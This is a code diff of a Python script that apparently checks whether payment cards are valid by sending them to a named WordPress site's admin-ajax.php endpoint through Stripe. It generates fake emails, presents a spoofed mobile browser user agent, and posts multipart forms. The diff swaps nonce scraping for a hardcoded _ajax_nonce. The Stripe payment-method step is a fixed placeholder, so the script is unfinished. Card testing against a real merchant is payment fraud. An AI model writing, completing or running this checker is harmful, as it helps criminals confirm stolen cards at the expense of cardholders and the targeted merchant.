@@ -13,21 +13,18 @@ FINAL_URL = "https://kiltermonpurepasture.com/wp-admin/admin-ajax.php"
 def get_random_email():
     return fake.email()
 
-def get_cookies_and_nonce():
+def get_cookies_from_first_url():
     session = requests.Session()
+    # Simulate a browser visit to get cookies
     resp = session.get(FIRST_URL, headers={
         "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/130.0.6723.37 Mobile/15E148 Safari/604.1"
     })
     cookies = session.cookies.get_dict()
-    # Try to extract _ajax_nonce from HTML (hidden input or JS variable)
-    match = re.search(r'name="_ajax_nonce"\s+value="([^"]+)"', resp.text)
-    if not match:
-        match = re.search(r'_ajax_nonce["\']\s*:\s*["\']([^"\']+)["\']', resp.text)
-    nonce = match.group(1) if match else None
-    return cookies, nonce
+    return cookies
 
 def extract_pm_id(card, email):
-    # Placeholder: implement Stripe logic as needed
+    # Simulate Stripe API call to get pm_... (you should implement this if needed)
+    # For now, return a placeholder or implement the actual logic if you have it
     return "pm_1RLFKDCGos24OgXQ470HOXnj"
 
 def build_cookie_header(cookies):
@@ -44,11 +41,8 @@ def check_card(card_data):
         return "❌ Invalid year format (use 2 or 4 digits)."
 
     email = get_random_email()
-    cookies, ajax_nonce = get_cookies_and_nonce()
-    if not ajax_nonce:
-        return "❌ Could not find _ajax_nonce value on the page."
-
-    pm_id = extract_pm_id(card_data, email)
+    cookies = get_cookies_from_first_url()
+    pm_id = extract_pm_id(card_data, email)  # You should implement this call to Stripe if needed
 
     boundary = '----WebKitFormBoundaryLDAs04rYKJqlswfi'
     data = (
@@ -60,7 +54,7 @@ def check_card(card_data):
         f'{pm_id}\r\n'
         f'--{boundary}\r\n'
         f'Content-Disposition: form-data; name="_ajax_nonce"\r\n\r\n'
-        f'{ajax_nonce}\r\n'
+        f'4858c65548\r\n'
         f'--{boundary}--\r\n'
     )
 
